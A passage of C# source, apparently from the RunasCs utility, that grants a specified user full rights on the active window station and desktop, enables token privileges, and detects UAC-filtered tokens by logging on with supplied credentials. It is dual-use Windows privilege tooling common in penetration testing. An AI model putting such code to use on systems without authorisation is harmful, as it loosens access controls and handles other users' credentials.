    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACE_HEADER
    {
        public byte AceType;
        public byte AceFlags;
        public short AceSize;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACCESS_ALLOWED_ACE
    {
        public ACE_HEADER Header;
        public ACCESS_MASK Mask;
        public uint SidStart;
    }
    
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetProcessWindowStation();

    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex,[Out] byte [] pvInfo, uint nLength, out uint lpnLengthNeeded);

    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta,[MarshalAs(UnmanagedType.Bool)]bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [DllImport("user32.dll")]
    private static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CloseWindowStation(IntPtr hWinsta);
    
    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool CloseDesktop(IntPtr hDesktop);
    
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetProcessWindowStation(IntPtr hWinSta);
 
    [DllImport("advapi32.dll")]
    private static extern IntPtr FreeSid(IntPtr pSid);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl,[MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetAclInformation(IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInformation, uint nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool InitializeSecurityDescriptor(IntPtr SecurityDescriptor, uint dwRevision);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int GetLengthSid(IntPtr pSID);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetAce(IntPtr aclPtr, int aceIndex, out IntPtr acePtr);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAce(IntPtr pAcl, uint dwAceRevision, uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, ACCESS_MASK AccessMask, IntPtr pSid);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool CopySid(uint nDestinationSidLength, IntPtr pDestinationSid, IntPtr pSourceSid);
    
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
    private static extern bool LookupAccountName(string lpSystemName, string lpAccountName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
    
    
    private IntPtr hWinsta;
    private IntPtr hDesktop;
    private IntPtr userSid;

    public WindowStationDACL()
    {
        this.hWinsta = IntPtr.Zero;
        this.hDesktop = IntPtr.Zero;
        this.userSid = IntPtr.Zero;
    }
    
    private IntPtr GetUserSid(string domain, string username){
        IntPtr userSid = IntPtr.Zero;
        string fqan = "";//Fully qualified account names
        byte [] Sid = null;
        uint cbSid = 0;
        StringBuilder referencedDomainName = new StringBuilder();
        uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
        SID_NAME_USE sidUse;
        int err = NO_ERROR;
        
        if(domain != "" && domain != ".")
            fqan = domain + "\\" + username;
        else
            fqan = username;
        
        if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
        {
            err = Marshal.GetLastWin32Error();
            if (err == ERROR_INSUFFICIENT_BUFFER || err == ERROR_INVALID_FLAGS)
            {
                Sid = new byte[cbSid];
                referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                err = NO_ERROR;
                if (!LookupAccountName(null,fqan,Sid,ref cbSid,referencedDomainName,ref cchReferencedDomainName,out sidUse))
                    err = Marshal.GetLastWin32Error();
            }
        }
        else{
            string error = "The username " + fqan + " has not been found.\r\n";
            error += "[-] LookupAccountName failed with error code " + Marshal.GetLastWin32Error();
            throw new RunasCsException(error);
        }
        if (err == 0)
        {
            userSid = Marshal.AllocHGlobal((int)cbSid);
            Marshal.Copy(Sid, 0, userSid, (int)cbSid);
        }
        else{
            string error = "The username " + fqan + " has not been found.\r\n";
            error += "[-] LookupAccountName failed with error code " + Marshal.GetLastWin32Error();
            throw new RunasCsException(error);
        }
        return userSid;
    }
    
    //Big thanks to Vanara project
    //https://github.com/dahall/Vanara/blob/9771eadebc874cfe876011c9d6588aefb62626d9/PInvoke/Security/AdvApi32/SecurityBaseApi.cs#L4656
    private void AddAllowedAceToDACL(IntPtr pDacl, ACCESS_MASK mask, byte aceFlags, uint aceSize){
        int offset = Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) - Marshal.SizeOf(typeof(uint));
        ACE_HEADER AceHeader = new ACE_HEADER();
        AceHeader.AceType = ACCESS_ALLOWED_ACE_TYPE;
        AceHeader.AceFlags = aceFlags;
        AceHeader.AceSize = (short)aceSize;
        IntPtr pNewAcePtr = Marshal.AllocHGlobal((int)aceSize);
        ACCESS_ALLOWED_ACE pNewAceStruct = new ACCESS_ALLOWED_ACE();
        pNewAceStruct.Header = AceHeader;
        pNewAceStruct.Mask = mask;
        Marshal.StructureToPtr(pNewAceStruct, pNewAcePtr, false);
        IntPtr sidStartPtr = new IntPtr(pNewAcePtr.ToInt64() + offset);
        if (!CopySid((uint)GetLengthSid(this.userSid), sidStartPtr, this.userSid))
        {
            throw new RunasCsException("CopySid failed with error code " + Marshal.GetLastWin32Error());
        }
        if (!AddAce(pDacl, ACL_REVISION, MAXDWORD, pNewAcePtr, aceSize))
        {
            throw new RunasCsException("AddAce failed with error code " + Marshal.GetLastWin32Error());
        }
        Marshal.FreeHGlobal(pNewAcePtr);
    }

    private void AddAceToWindowStation(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                throw new RunasCsException("GetUserObjectSecurity 1 size failed with error code " + Marshal.GetLastWin32Error());
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hWinsta, ref si, pSd, cbSd, out cbSd))
        {
            throw new RunasCsException("GetUserObjectSecurity 2 failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            throw new RunasCsException("GetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                throw new RunasCsException("GetAclInformation failed with error code " + Marshal.GetLastWin32Error());
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            throw new RunasCsException("InitializeSecurityDescriptor failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + (cbNewAce*2);//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + (cbNewAce*2);

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            throw new RunasCsException("InitializeAcl failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    throw new RunasCsException("GetAce failed with error code " + Marshal.GetLastWin32Error());
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    throw new RunasCsException("AddAce failed with error code " + Marshal.GetLastWin32Error());
                }
            }
        }
        
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.GENERIC_ACCESS, CONTAINER_INHERIT_ACE | INHERIT_ONLY_ACE | OBJECT_INHERIT_ACE, cbNewAce);
        AddAllowedAceToDACL(pNewDacl, ACCESS_MASK.WINSTA_ALL, NO_PROPAGATE_INHERIT_ACE, cbNewAce);
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            throw new RunasCsException("SetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hWinsta, ref si, pNewSd))
        {
            throw new RunasCsException("SetUserObjectSecurity failed with error code " + Marshal.GetLastWin32Error());
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    
    private void AddAceToDesktop(){
        uint cbSd = 0;
        bool fDaclPresent = false;
        bool fDaclExist = false;
        IntPtr pDacl = IntPtr.Zero;
        uint cbDacl = 0;
        IntPtr pSd = IntPtr.Zero;
        IntPtr pNewSd = IntPtr.Zero;
        uint cbNewDacl = 0;
        uint cbNewAce = 0;
        IntPtr pNewDacl = IntPtr.Zero;
        
        ACL_SIZE_INFORMATION aclSizeInfo = new ACL_SIZE_INFORMATION();
        SECURITY_INFORMATION si = SECURITY_INFORMATION.DACL_SECURITY_INFORMATION;
        // Get required buffer size and allocate the SECURITY_DESCRIPTOR buffer.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, 0, out cbSd))
        {
            if (Marshal.GetLastWin32Error() != ERROR_INSUFFICIENT_BUFFER)
            {
                throw new RunasCsException("GetUserObjectSecurity 1 size failed with error code " + Marshal.GetLastWin32Error());
            }
        }
        pSd = Marshal.AllocHGlobal((int)cbSd);
        // Obtain the security descriptor for the desktop object.
        if (!GetUserObjectSecurity(this.hDesktop, ref si, pSd, cbSd, out cbSd))
        {
            throw new RunasCsException("GetUserObjectSecurity 2 failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the DACL from the security descriptor.
        if (!GetSecurityDescriptorDacl(pSd, out fDaclPresent, ref pDacl, out fDaclExist))
        {
            throw new RunasCsException("GetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        // Get the size information of the DACL.
        if (pDacl == IntPtr.Zero)
        {
            cbDacl = 0;
        }
        else
        {
            if (!GetAclInformation(pDacl, ref aclSizeInfo, (uint)Marshal.SizeOf(typeof(ACL_SIZE_INFORMATION)), ACL_INFORMATION_CLASS.AclSizeInformation))
            {
                throw new RunasCsException("GetAclInformation failed with error code " + Marshal.GetLastWin32Error());
            }
            cbDacl = aclSizeInfo.AclBytesInUse;
        }
        
        // Allocate memory for the new security descriptor.
        pNewSd = Marshal.AllocHGlobal((int)cbSd);
        // Initialize the new security descriptor.
        if (!InitializeSecurityDescriptor(pNewSd, SECURITY_DESCRIPTOR_REVISION))
        {
            throw new RunasCsException("InitializeSecurityDescriptor failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // Compute the size of a DACL to be added to the new security descriptor.
        cbNewAce = (uint)Marshal.SizeOf(typeof(ACCESS_ALLOWED_ACE)) + (uint)GetLengthSid(this.userSid) - (uint)Marshal.SizeOf(typeof(uint));
        if(cbDacl == 0)
            cbNewDacl =  8 + cbNewAce;//8 = sizeof(ACL)
        else
            cbNewDacl = cbDacl + cbNewAce;

        // Allocate memory for the new DACL.
        pNewDacl = Marshal.AllocHGlobal((int)cbNewDacl);
        // Initialize the new DACL.
        if (!InitializeAcl(pNewDacl, cbNewDacl, ACL_REVISION))
        {
            throw new RunasCsException("InitializeAcl failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // If the original DACL is present, copy it to the new DACL.
        if (fDaclPresent)
        {
            // Copy the ACEs to the new DACL.
            for (int dwIndex = 0; dwIndex < aclSizeInfo.AceCount; dwIndex++)
            {
                IntPtr pTempAce = IntPtr.Zero;
                // Get an ACE.
                if (!GetAce(pDacl, dwIndex, out pTempAce))
                {
                    throw new RunasCsException("GetAce failed with error code " + Marshal.GetLastWin32Error());
                }
                ACE_HEADER pTempAceStruct = (ACE_HEADER)Marshal.PtrToStructure(pTempAce, typeof(ACE_HEADER));
                // Add the ACE to the new ACL.
                if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, (uint)pTempAceStruct.AceSize))
                {
                    throw new RunasCsException("AddAce failed with error code " + Marshal.GetLastWin32Error());
                }
            }
        }
        
        // Add a new ACE to the new DACL.
        if (!AddAccessAllowedAce(pNewDacl, ACL_REVISION, ACCESS_MASK.DESKTOP_ALL, this.userSid))
        {
            throw new RunasCsException("AddAccessAllowedAce failed with error code " + Marshal.GetLastWin32Error());
        }
        
        // Assign the new DACL to the new security descriptor.
        if (!SetSecurityDescriptorDacl(pNewSd, true, pNewDacl, false))
        {
            throw new RunasCsException("SetSecurityDescriptorDacl failed with error code " + Marshal.GetLastWin32Error());
        }
        //  Set the new security descriptor for the desktop object.
        if (!SetUserObjectSecurity(this.hDesktop, ref si, pNewSd))
        {
            throw new RunasCsException("SetUserObjectSecurity failed with error code " + Marshal.GetLastWin32Error());
        }
        
        Marshal.FreeHGlobal(pSd);
        Marshal.FreeHGlobal(pNewSd);
        Marshal.FreeHGlobal(pNewDacl);
    }
    

    public string AddAclToActiveWindowStation(string domain, string username, int logonType){
        string lpDesktop = "";
        byte[] stationNameBytes = new byte[256];
        string stationName = "";
        uint lengthNeeded = 0;
        IntPtr hWinstaSave = GetProcessWindowStation();
        if(hWinstaSave == IntPtr.Zero)
        {
            throw new RunasCsException("GetProcessWindowStation failed with error code " + Marshal.GetLastWin32Error());
        }
        if(!GetUserObjectInformation(hWinstaSave, UOI_NAME, stationNameBytes, 256, out lengthNeeded)){
            throw new RunasCsException("GetUserObjectInformation failed with error code " + Marshal.GetLastWin32Error());
        }
        stationName = Encoding.Default.GetString(stationNameBytes).Substring(0, (int)lengthNeeded-1);

        // this should be avoided with the LOGON32_LOGON_NEW_CREDENTIALS logon type or some bug can happen in LookupAccountName()
        if (logonType != 9)
        {
            this.hWinsta = OpenWindowStation(stationName, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC);
            if (this.hWinsta == IntPtr.Zero)
            {
                throw new RunasCsException("OpenWindowStation failed with error code " + Marshal.GetLastWin32Error());
            }

            if (!SetProcessWindowStation(this.hWinsta))
            {
                throw new RunasCsException("SetProcessWindowStation hWinsta failed with error code " + Marshal.GetLastWin32Error());
            }

            this.hDesktop = OpenDesktop("Default", 0, false, ACCESS_MASK.READ_CONTROL | ACCESS_MASK.WRITE_DAC | ACCESS_MASK.DESKTOP_WRITEOBJECTS | ACCESS_MASK.DESKTOP_READOBJECTS);
            if (!SetProcessWindowStation(hWinstaSave))
            {
                throw new RunasCsException("SetProcessWindowStation hWinstaSave failed with error code " + Marshal.GetLastWin32Error());
            }

            if (this.hWinsta == IntPtr.Zero)
            {
                throw new RunasCsException("OpenDesktop failed with error code " + Marshal.GetLastWin32Error());
            }

            this.userSid = GetUserSid(domain, username);
            AddAceToWindowStation();
            AddAceToDesktop();
        }

        lpDesktop = stationName + "\\Default";
        return lpDesktop;
    }
    
    public void CleanupHandles()
    {
        if(this.hWinsta != IntPtr.Zero) CloseWindowStation(this.hWinsta);
        if(this.hDesktop != IntPtr.Zero) CloseDesktop(this.hDesktop);
        if(this.userSid != IntPtr.Zero) FreeSid(this.userSid);
    }
}

public static class AccessToken{

    // Mandatory Label SIDs (integrity levels)
    private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0;
    private const int SECURITY_MANDATORY_LOW_RID = 0x1000;
    private const int SECURITY_MANDATORY_MEDIUM_RID = 0x2000;
    private const int SECURITY_MANDATORY_HIGH_RID = 0x3000;
    private const int SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
    private const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x5000;
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    private static readonly byte[] MANDATORY_LABEL_AUTHORITY = new byte[] { 0, 0, 0, 0, 0, 16 };
    private const int LOGON32_PROVIDER_DEFAULT = 0;
    private const int LOGON32_LOGON_INTERACTIVE = 2;
    private const int LOGON32_LOGON_NETWORK = 3;

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, StringBuilder lpName, ref int cchName );

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AllocateAndInitializeSid(IntPtr pIdentifierAuthority, byte nSubAuthorityCount, int dwSubAuthority0, int dwSubAuthority1, int dwSubAuthority2, int dwSubAuthority3, int dwSubAuthority4, int dwSubAuthority5,  int dwSubAuthority6, int dwSubAuthority7, out IntPtr pSid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)] ref TOKEN_PRIVILEGES_2 Newstate, int bufferlength, int PreivousState, int Returnlength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName, [MarshalAs(UnmanagedType.LPStr)] string pszDomain, [MarshalAs(UnmanagedType.LPStr)] string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    
    [DllImport("Kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin,
        TokenElevationType,
        TokenLinkedToken,
        TokenElevation,
        TokenHasRestrictions,
        TokenAccessInformation,
        TokenVirtualizationAllowed,
        TokenVirtualizationEnabled,
        TokenIntegrityLevel,
        TokenUIAccess,
        TokenMandatoryPolicy,
        TokenLogonSid,
        TokenIsAppContainer,
        TokenCapabilities,
        TokenAppContainerSid,
        TokenAppContainerNumber,
        TokenUserClaimAttributes,
        TokenDeviceClaimAttributes,
        TokenRestrictedUserClaimAttributes,
        TokenRestrictedDeviceClaimAttributes,
        TokenDeviceGroups,
        TokenRestrictedDeviceGroups,
        TokenSecurityAttributes,
        TokenIsRestricted,
        TokenProcessTrustLevel,
        TokenPrivateNameSpace,
        TokenSingletonAttributes,
        TokenBnoIsolation,
        TokenChildProcessFlags,
        TokenIsLessPrivilegedAppContainer,
        TokenIsSandboxed,
        TokenIsAppSilo,
        MaxTokenInfoClass
    }

    public enum IntegrityLevel : int
    {
        Same = -2,
        Unknown = -1,
        Untrusted = SECURITY_MANDATORY_UNTRUSTED_RID,
        Low = SECURITY_MANDATORY_LOW_RID,
        Medium = SECURITY_MANDATORY_MEDIUM_RID,
        High = SECURITY_MANDATORY_HIGH_RID,
        System = SECURITY_MANDATORY_SYSTEM_RID,
        ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID
    }

    public enum TokenGroupAttributes : uint
    {
        Disabled = 0,
        SE_GROUP_MANDATORY = 1,
        SE_GROUP_ENABLED_BY_DEFAULT = 0x2,
        SE_GROUP_ENABLED = 0x4,
        SE_GROUP_OWNER = 0x8,
        SE_GROUP_USE_FOR_DENY_ONLY = 0x10,
        SE_GROUP_INTEGRITY = 0x20,
        SE_GROUP_INTEGRITY_ENABLED = 0x40,
        SE_GROUP_RESOURCE = 0x20000000,
        SE_GROUP_LOGON_ID = 0xC0000000
    }

    private struct TOKEN_PRIVILEGES {
       public int PrivilegeCount;
       [MarshalAs(UnmanagedType.ByValArray, SizeConst=64)]
       public LUID_AND_ATTRIBUTES [] Privileges;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES_2
    {
        public UInt32 PrivilegeCount;
        public LUID Luid;
        public UInt32 Attributes;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    private struct LUID_AND_ATTRIBUTES {
       public LUID Luid;
       public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID {
       public UInt32 LowPart;
       public Int32 HighPart;
    }

    private struct TOKEN_ELEVATION {
        public UInt32 TokenIsElevated;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_IDENTIFIER_AUTHORITY
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
        public byte[] Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SID_AND_ATTRIBUTES
    {
        public IntPtr pSID;
        public TokenGroupAttributes Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_MANDATORY_LABEL
    {
        public SID_AND_ATTRIBUTES Label;
    }

    private static string convertAttributeToString(UInt32 attribute){
        if(attribute == 0)
            return "Disabled";
        if(attribute == 1)
            return "Enabled Default";
        if(attribute == 2)
            return "Enabled";
        if(attribute == 3)
            return "Enabled|Enabled Default";
        return "Error";
    }

    private static string EnablePrivilege(string privilege, IntPtr token)
    {
        string output = "";
        LUID sebLuid = new LUID();
        TOKEN_PRIVILEGES_2 tokenp = new TOKEN_PRIVILEGES_2();
        tokenp.PrivilegeCount = 1;
        LookupPrivilegeValue(null, privilege, ref sebLuid);
        tokenp.Luid = sebLuid;
        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0))
        {
            throw new RunasCsException("AdjustTokenPrivileges on privilege " + privilege + " failed with error code: " + Marshal.GetLastWin32Error());
        }
        output += "\r\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
        return output;
    }

    public static List<string[]> GetTokenPrivileges(IntPtr tHandle){
        List<string[]> privileges = new List<string[]>();
        uint TokenInfLength=0;
        bool Result; 
        //Get TokenInformation length in TokenInfLength
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength);
        IntPtr TokenInformation = Marshal.AllocHGlobal((int)TokenInfLength) ;
        Result = GetTokenInformation(tHandle, TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength) ; 
        if (Result == false){
            throw new RunasCsException("GetTokenInformation failed with error code " + Marshal.GetLastWin32Error());
        }
        TOKEN_PRIVILEGES TokenPrivileges = ( TOKEN_PRIVILEGES )Marshal.PtrToStructure( TokenInformation , typeof( TOKEN_PRIVILEGES ) ) ;
        for(int i=0;i<TokenPrivileges.PrivilegeCount;i++){
            StringBuilder sb = new StringBuilder();
            int luidNameLen = 0;
            LUID luid = new LUID();
            string[] privilegeStatus = new string[2];
            luid = TokenPrivileges.Privileges[i].Luid;
            IntPtr ptrLuid = Marshal.AllocHGlobal(Marshal.SizeOf(luid));
            Marshal.StructureToPtr(luid, ptrLuid, true);
            LookupPrivilegeName(null, ptrLuid, null, ref luidNameLen); // call once to get the name len
            sb.EnsureCapacity(luidNameLen + 1);
            Result = LookupPrivilegeName(null, ptrLuid, sb, ref luidNameLen);// call again to get the name
            if (Result == false){
                throw new RunasCsException("LookupPrivilegeName failed with error code " + Marshal.GetLastWin32Error());
            }
            privilegeStatus[0]=sb.ToString();
            privilegeStatus[1]=convertAttributeToString(TokenPrivileges.Privileges[i].Attributes);
            privileges.Add(privilegeStatus);
        }
        return privileges;
    }

    public static bool IsLimitedUACToken(IntPtr hToken, string username, string domainName, string password) {
        bool filtered = false, Result = false, Result2 = false;
        int TokenInfLength = 0;
        IntPtr hTokenInteractive = IntPtr.Zero;
        IntPtr hTokenNetwork = IntPtr.Zero;
        // first call gets lenght of TokenInformation
        Result = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, TokenInfLength, out TokenInfLength);
        IntPtr tokenElevationPtr = Marshal.AllocHGlobal(TokenInfLength);
        // then calls retrieving the required value
        Result = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, tokenElevationPtr, TokenInfLength, out TokenInfLength);
        if (Result)
        {
            TOKEN_ELEVATION tokenElevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenElevationPtr, typeof(TOKEN_ELEVATION));
            if (tokenElevation.TokenIsElevated == 0)
                filtered = true;
        }
        Marshal.FreeHGlobal(tokenElevationPtr);
        // second iteration of token checks. Check differences between Interactive and Network logon types. If IL mismatch, UAC applied some restrictions
        if (filtered) {
            Result = LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenInteractive);
            Result2 = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, ref hTokenNetwork);
            if (Result && Result2) {
                if (AccessToken.GetTokenIntegrityLevel(hTokenInteractive) < AccessToken.GetTokenIntegrityLevel(hTokenNetwork))
                    filtered = true;
                else
                    filtered = false;
                CloseHandle(hTokenInteractive);
                CloseHandle(hTokenNetwork);
            }
            else {
                // in some edge cases we can land here, check the UAC registry key as a last desperate attempt
                Int32 uacEnabled = (Int32)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", null);
                if (uacEnabled == 1)
                    filtered = true;
                else
                    filtered = false;
            }
        }
        return filtered;
    }

